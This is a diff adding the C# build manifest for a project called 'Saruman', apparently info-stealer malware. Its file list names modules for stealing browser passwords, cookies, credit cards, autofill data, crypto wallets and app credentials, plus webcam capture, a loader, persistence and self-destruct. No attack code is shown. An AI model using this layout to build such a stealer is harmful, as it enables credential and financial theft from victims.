@@ -1,0 +1,141 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{7A6452F3-6428-4D21-A9F1-0CD2B7B92322}</ProjectGuid>
+    <OutputType>Exe</OutputType>
+    <RootNamespace>Saruman</RootNamespace>
+    <AssemblyName>Saruman</AssemblyName>
+    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+    <TargetFrameworkProfile />
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <Prefer32Bit>false</Prefer32Bit>
+  </PropertyGroup>
+  <PropertyGroup>
+    <AutoGenerateBindingRedirects>true</AutoGenerateBindingRedirects>
+  </PropertyGroup>
+  <PropertyGroup>
+    <StartupObject>Saruman.Program</StartupObject>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="PresentationFramework" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.IO.Compression.FileSystem" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml.Linq" />
+    <Reference Include="System.Data.DataSetExtensions" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="Browser_Parse.cs" />
+    <Compile Include="cli.cs" />
+    <Compile Include="crypt.cs" />
+    <Compile Include="Implant\SelfDestruct.cs" />
+    <Compile Include="Implant\StartDelay.cs" />
+    <Compile Include="Implant\Startup.cs" />
+    <Compile Include="Implant\StringsCrypt.cs" />
+    <Compile Include="Program.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Intelegency\IntelegencyWork.cs" />
+    <Compile Include="Settings.cs" />
+    <Compile Include="Stealer\Cookies\GetCookies.cs" />
+    <Compile Include="Stealer\Credit_Cards\Get_Credit_Cards.cs" />
+    <Compile Include="Stealer\Gecko.cs" />
+    <Compile Include="Stealer\Passwords\GetPasswords.cs" />
+    <Compile Include="Stealer\WebData\Get_Browser_Autofill.cs" />
+    <Compile Include="SystemInfo.cs" />
+    <Compile Include="Utilies\AeadParameters.cs" />
+    <Compile Include="Utilies\AesFastEngine.cs" />
+    <Compile Include="Utilies\AesGcm256.cs" />
+    <Compile Include="Utilies\App\FileZilla.cs" />
+    <Compile Include="Utilies\App\NordVpn.cs" />
+    <Compile Include="Utilies\App\Steam.cs" />
+    <Compile Include="Utilies\App\Telegram.cs" />
+    <Compile Include="Utilies\Arrays.cs" />
+    <Compile Include="Utilies\CryptoException.cs" />
+    <Compile Include="Utilies\CryptoGrafy\crypt.cs" />
+    <Compile Include="Utilies\DataLengthException.cs" />
+    <Compile Include="Utilies\DecryptAPI.cs" />
+    <Compile Include="Utilies\DomainDetect.cs" />
+    <Compile Include="Utilies\GcmBlockCipher.cs" />
+    <Compile Include="Utilies\GcmUtilities.cs" />
+    <Compile Include="Utilies\Gecko\Gecko1.cs" />
+    <Compile Include="Utilies\Gecko\Gecko2.cs" />
+    <Compile Include="Utilies\Gecko\Gecko3.cs" />
+    <Compile Include="Utilies\Gecko\Gecko4.cs" />
+    <Compile Include="Utilies\Gecko\Gecko5.cs" />
+    <Compile Include="Utilies\Gecko\Gecko6.cs" />
+    <Compile Include="Utilies\Gecko\Gecko7.cs" />
+    <Compile Include="Utilies\Gecko\Gecko8.cs" />
+    <Compile Include="Utilies\Gecko\Gecko9.cs" />
+    <Compile Include="Utilies\GetDirPath.cs" />
+    <Compile Include="Utilies\GetWebcam.cs" />
+    <Compile Include="Utilies\grabber.cs" />
+    <Compile Include="Utilies\Hardware\Hardware.cs" />
+    <Compile Include="Utilies\HomeDirectory.cs" />
+    <Compile Include="Utilies\IAeadBlockCipher.cs" />
+    <Compile Include="Utilies\IBlockCipher.cs" />
+    <Compile Include="Utilies\ICipherParameters.cs" />
+    <Compile Include="Utilies\IGcmMultiplier.cs" />
+    <Compile Include="Utilies\InvalidCipherTextException.cs" />
+    <Compile Include="Utilies\IsNullExtension.cs" />
+    <Compile Include="Utilies\json\JavaScriptReader.cs" />
+    <Compile Include="Utilies\json\JsonArray.cs" />
+    <Compile Include="Utilies\json\JsonExt.cs" />
+    <Compile Include="Utilies\json\JsonObject.cs" />
+    <Compile Include="Utilies\json\JsonPrimitive.cs" />
+    <Compile Include="Utilies\json\JsonType.cs" />
+    <Compile Include="Utilies\json\JsonValue.cs" />
+    <Compile Include="Utilies\KeyParameter.cs" />
+    <Compile Include="Utilies\loader.cs" />
+    <Compile Include="Utilies\Pack.cs" />
+    <Compile Include="Utilies\ParametersWithIV.cs" />
+    <Compile Include="Utilies\Resources.cs" />
+    <Compile Include="Utilies\screen.cs" />
+    <Compile Include="Utilies\SqlHandler.cs" />
+    <Compile Include="Utilies\sqlite\CNT.cs" />
+    <Compile Include="Utilies\sqlite\IsNullExtension.cs" />
+    <Compile Include="Utilies\sqlite\row.cs" />
+    <Compile Include="Utilies\sqlite\settings.cs" />
+    <Compile Include="Utilies\sqlite\size.cs" />
+    <Compile Include="Utilies\sqlite\StringExtension.cs" />
+    <Compile Include="Utilies\Tables8kGcmMultiplier.cs" />
+    <Compile Include="Utilies\UserAgents.cs" />
+    <Compile Include="Utilies\VaultCli.cs" />
+    <Compile Include="Utilies\Wallets\Wallets.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.config" />
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
